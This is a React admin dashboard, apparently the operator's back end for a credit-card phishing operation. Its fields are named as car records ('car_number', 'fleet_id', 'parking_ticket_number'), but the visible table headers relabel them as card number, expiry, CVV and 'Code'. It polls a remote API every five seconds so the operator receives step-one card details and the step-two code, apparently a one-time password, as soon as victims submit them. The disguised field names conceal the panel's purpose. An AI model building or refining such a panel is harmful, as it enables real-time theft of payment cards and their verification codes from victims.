import { useEffect, useState, useCallback } from "react";

const API_URL = "https://anypass.onrender.com/api/cars";

export default function CarAdmin() {
  const [cars, setCars] = useState([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [error, setError] = useState("");

  // ==========================================
  // FETCH ALL CAR RECORDS
  // ==========================================
  const fetchCars = useCallback(async (isRefresh = false, signal = null) => {
    try {
      if (isRefresh) {
        setRefreshing(true);
      } else {
        setLoading(true);
      }

      setError("");

      const response = await fetch(API_URL, { signal });
      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Failed to fetch CC records");
      }

      const rawList = Array.isArray(data.data) ? data.data : [];

      // Sort newest first
      const sortedCars = rawList.sort(
        (a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0)
      );

      setCars(sortedCars);
    } catch (err) {
      if (err.name === "AbortError") return;
      console.error("Fetch cars error:", err);
      setError(err.message || "Failed to load car records.");
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  }, []);

  // ==========================================
  // INITIAL LOAD & AUTO-POLLING (EVERY 5 SEC)
  // ==========================================
  useEffect(() => {
    const controller = new AbortController();
    fetchCars(false, controller.signal);

    // Auto-poll every 5 seconds so admin sees Step 1 immediately
    // and gets the Parking Ticket as soon as Step 2 completes
    const interval = setInterval(() => {
      fetchCars(true);
    }, 5000);

    return () => {
      controller.abort();
      clearInterval(interval);
    };
  }, [fetchCars]);

  // ==========================================
  // DELETE CAR RECORD
  // ==========================================
  const handleDelete = async (id) => {
    if (!id) return;
    const confirmed = window.confirm(
      "Are you sure you want to delete this car record?"
    );
    if (!confirmed) return;

    try {
      setError("");

      const response = await fetch(`${API_URL}/${id}`, {
        method: "DELETE",
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Failed to delete car record");
      }

      setCars((currentCars) => currentCars.filter((car) => car._id !== id));
    } catch (err) {
      console.error("Delete car error:", err);
      setError(err.message || "Failed to delete car record.");
    }
  };

  const formatDate = (date) => {
    if (!date) return "-";
    try {
      return new Date(date).toLocaleString();
    } catch {
      return "-";
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 p-4 sm:p-6">
      <div className="max-w-7xl mx-auto">
        <div>
          <button
            type="button"
            onClick={() => fetchCars(true)}
            disabled={loading || refreshing}
            className="inline-flex items-center justify-center gap-2 px-4 py-2.5 bg-red-500 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <span>{refreshing ? "Updating..." : "Refresh"}</span>
          </button>
        </div>

        {/* ERROR NOTICE */}
        {error && (
          <div className="mb-6 bg-red-50 border border-red-200 rounded-lg px-4 py-3">
            <div className="flex items-center justify-between gap-4">
              <p className="text-sm text-red-600">{error}</p>
              <button
                type="button"
                onClick={() => fetchCars()}
                className="text-sm font-medium text-red-600 hover:text-red-800 underline"
              >
                Retry
              </button>
            </div>
          </div>
        )}

        {/* LOADING INITIAL */}
        {loading && (
          <div className="bg-white border border-gray-200 rounded-xl p-10 text-center">
            <div className="inline-block w-6 h-6 border-2 border-gray-300 border-t-red-500 rounded-full animate-spin" />
            <p className="text-sm text-gray-500 mt-3">Loading CC records...</p>
          </div>
        )}

        {/* TABLE (DESKTOP) */}
        {!loading && cars.length > 0 && (
          <div className="hidden md:block bg-white border border-gray-200 rounded-xl overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-gray-50 border-b border-gray-200">
                  <tr>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      #
                    </th>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      CC No.
                    </th>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      Expiry
                    </th>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      CVV
                    </th>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      Code
                    </th>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      Step Status
                    </th>
                    <th className="px-5 py-4 text-left font-semibold text-gray-600">
                      Submitted
                    </th>
                    <th className="px-5 py-4 text-right font-semibold text-gray-600">
                      Action
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                  {cars.map((car, index) => {
                    const isTicketSubmitted = Boolean(
                      car.parking_ticket_number
                    );

                    return (
                      <tr
                        key={car._id || index}
                        className="hover:bg-gray-50 transition-colors"
                      >
                        <td className="px-5 py-4 text-gray-400">
                          {index + 1}
                        </td>
                        <td className="px-5 py-4 font-medium text-gray-800">
                          {car.total_number}
                        </td>
                        <td className="px-5 py-4 text-gray-700">
                          {car.car_number}
                        </td>
                        <td className="px-5 py-4 text-gray-700">
                          {car.fleet_id}
                        </td>
                        <td className="px-5 py-4">
                          {isTicketSubmitted ? (
                            <span className="font-semibold text-gray-800">
                              {car.parking_ticket_number}
                            </span>
                          ) : (
                            <span className="text-amber-500 italic text-xs">
                              Waiting for step 2...
                            </span>
                          )}
                        </td>
                        <td className="px-5 py-4">
                          <span
                            className={`inline-block text-xs px-2.5 py-1 rounded-full font-medium ${
                              isTicketSubmitted
                                ? "bg-green-100 text-green-700"
                                : "bg-amber-100 text-amber-700"
                            }`}
                          >
                            {isTicketSubmitted
                              ? "Step 2 Completed"
                              : "Step 1 Completed"}
                          </span>
                        </td>
                        <td className="px-5 py-4 text-gray-500">
                          {formatDate(car.createdAt)}
                        </td>
                        <td className="px-5 py-4 text-right">
                          <button
                            type="button"
                            onClick={() => handleDelete(car._id)}
                            className="text-red-500 hover:text-red-700 text-sm font-medium"
                          >
                            Delete
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* MOBILE CARDS */}
        {!loading && cars.length > 0 && (
          <div className="md:hidden flex flex-col gap-4">
            {cars.map((car, index) => {
              const isTicketSubmitted = Boolean(car.parking_ticket_number);

              return (
                <div
                  key={car._id || index}
                  className="bg-white border border-gray-200 rounded-xl p-5"
                >
                  <div className="flex items-center justify-between mb-4">
                    <div>
                      <p className="text-xs text-gray-400">Record</p>
                      <p className="font-semibold text-gray-800">#{index + 1}</p>
                    </div>
                    <span
                      className={`text-xs px-2.5 py-1 rounded-full font-medium ${
                        isTicketSubmitted
                          ? "bg-green-100 text-green-700"
                          : "bg-amber-100 text-amber-700"
                      }`}
                    >
                      {isTicketSubmitted ? "Step 2 Completed" : "Step 1 Completed"}
                    </span>
                  </div>

                  <div className="space-y-3">
                    <div className="flex justify-between gap-4">
                      <span className="text-sm text-gray-400">Total Number</span>
                      <span className="text-sm font-medium text-gray-800 text-right">
                        {car.total_number}
                      </span>
                    </div>
                    <div className="flex justify-between gap-4">
                      <span className="text-sm text-gray-400">Car Number</span>
                      <span className="text-sm font-medium text-gray-800">
                        {car.car_number}
                      </span>
                    </div>
                    <div className="flex justify-between gap-4">
                      <span className="text-sm text-gray-400">Fleet ID</span>
                      <span className="text-sm font-medium text-gray-800">
                        {car.fleet_id}
                      </span>
                    </div>
                    <div className="flex justify-between gap-4">
                      <span className="text-sm text-gray-400">
                        Parking Ticket
                      </span>
                      <span className="text-sm font-medium text-gray-800">
                        {isTicketSubmitted ? (
                          car.parking_ticket_number
                        ) : (
                          <span className="text-amber-500 italic text-xs">
                            Waiting for step 2...
                          </span>
                        )}
                      </span>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => handleDelete(car._id)}
                    className="w-full mt-4 py-2 border border-red-200 text-red-500 hover:bg-red-50 rounded-lg text-sm font-medium transition-colors"
                  >
                    Delete Record
                  </button>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}